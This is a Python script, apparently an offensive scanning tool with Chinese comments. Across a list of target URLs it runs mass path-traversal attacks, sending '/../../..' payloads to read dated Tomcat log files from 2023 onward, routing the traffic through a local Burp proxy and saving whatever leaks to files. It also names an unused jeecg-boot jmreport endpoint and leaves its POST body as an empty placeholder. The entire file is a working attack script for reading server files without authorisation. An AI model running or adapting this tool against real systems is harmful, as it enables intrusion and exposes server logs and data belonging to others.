import argparse
import requests
import os
import threading
from tqdm import tqdm
from datetime import datetime, timedelta
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# 全局锁用于文件写入
write_lock = threading.Lock()

proxies = { #代理,流量导向burp
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# 中间件检测函数映射
DETECT_FUNCTIONS = {
    # 自定义部分,/usr/local/apache-tomcat-8.5.50/logs/ 可替换
    "tomcat": {
        "paths": [
            "/usr/local/apache-tomcat-8.5.50/logs/localhost_access_log",
            "/usr/local/apache-tomcat-8.5.50/logs/catalina",
            "/usr/local/apache-tomcat-8.5.50/logs/host-manager",
            "/usr/local/apache-tomcat-8.5.50/logs/localhost",
            "/usr/local/apache-tomcat-8.5.50/logs/localhost_access_log",
            "/usr/local/apache-tomcat-8.5.50/logs/manager",
            "/usr/local/apache-tomcat-8.5.50/logs/tomcat7-stderr",
            "/usr/local/apache-tomcat-8.5.50/logs/tomcat7-stdout"
        ],
        "function": None
    }
}

def calculate_total_tasks(targets, middleware_type):
    """计算总任务数用于进度条"""
    middleware_config = DETECT_FUNCTIONS[middleware_type]
    paths = middleware_config["paths"]
    date_count = sum(1 for _ in generate_dates())
    return len(targets) * len(paths) * date_count

def generate_dates():
    """生成日期范围迭代器"""
    # 自定义部分,可以设置从哪天开始爬取
    start_date = datetime(2023, 1, 1)
    end_date = datetime.now()
    delta = timedelta(days=1)
    while start_date <= end_date:
        yield start_date.strftime("%Y-%m-%d")
        start_date += delta


def check_tomcat(target_url, base_path, date, request_type):
    """Tomcat检测核心逻辑"""
    log_file = f"{base_path}.{date}.txt"

    # 自定义部分
    payload = f"/../../../../../../../../../../../../..{log_file}"
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/json"
    }

    # 自定义部分
    body = {
        # 用{payload}变量
    }
    try:
        if request_type == "GET":
            response = requests.get(
                # ?path=自定义
                url=f"{target_url}?path={quote(payload)}",
                headers=headers,
                timeout=15,
                verify=False,
                allow_redirects=False,
                proxies = proxies
            )
        elif request_type == "POST":
            response = requests.post(
                url=f"{target_url}",
                headers=headers,
                data=body,
                timeout=15,
                verify=False,
                allow_redirects=False,
                proxies=proxies
            )
        if response.status_code == 200 and len(response.text)>0:
            # print(response.text)
            return date, response.text
    except Exception:
        pass
    return None, None


def save_result(result_dir, date, content, url):
    """保存结果到文件"""
    filename = os.path.join(result_dir, f"{date}.txt")
    with write_lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"=== Found in {url} ===\n")
            f.write(content + "\n\n")


def worker(target_url, middleware_type, result_dir, base_path, date, request_type):
    """工作线程任务"""
    # 根据类型调用不同检测函数
    if middleware_type == "tomcat":
        found_date, content = check_tomcat(target_url, base_path, date, request_type)

    if content and found_date:
        save_result(result_dir, found_date, content, target_url)
        # print(f"\n[+] Vulnerable {target_url} found {found_date}")



def main():
    # 参数解析
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL,例如:http://127.0.0.1,路径和请求体需要自己到函数里改")
    group.add_argument("-f", "--file", help="File containing URLs")
    parser.add_argument("-type", required=True, choices=["tomcat"], help="Middleware type") #指定中间件类型
    parser.add_argument("-t", "--threads", type=int, default=20, help="Concurrency threads") #指定线程
    parser.add_argument("-r",required=True, choices=["GET", "POST"], help="GEY or POST URLs")
    args = parser.parse_args()

    # 请求类型
    request_type = args.r

    # 创建结果目录
    result_dir = f"{args.type}_results"
    os.makedirs(result_dir, exist_ok=True)

    # 获取目标URL列表
    targets = []
    if args.url:
        targets.append(args.url.strip())
    else:
        with open(args.file, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    # 准备检测参数
    middleware_config = DETECT_FUNCTIONS[args.type]
    paths = middleware_config["paths"]

    # 计算总任务数并初始化进度条
    total_tasks = calculate_total_tasks(targets, args.type)
    # pbar = tqdm(total=total_tasks, desc="Scanning Progress", unit="task")

    # 创建线程池
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for target in targets:
            # 标准化目标URL格式
            if not target:  # 跳过空行
                return
            if target.endswith("/"):
                path = "jeecg-boot/jmreport/qurestSql" #自定义部分
            else:
                path = "/jeecg-boot/jmreport/qurestSql" #自定义部分
            if not target.startswith("https://") and not target.startswith("http://"):
                target = "https://" + target
            for base_path in paths:
                for date in generate_dates():
                    # 提交任务到线程池
                    future = executor.submit(
                        worker,
                        target,
                        args.type,
                        result_dir,
                        base_path,
                        date,
                        request_type
                    )
                    futures.append(future)
                    # 等待所有任务完成
        with tqdm(total=total_tasks, desc="扫描进度", unit="task") as pbar:
            for future in as_completed(futures):
                pbar.update(1)
    pbar.close()
    print("\n[+] Scan completed! Results saved in:", result_dir)


if __name__ == "__main__":
    main()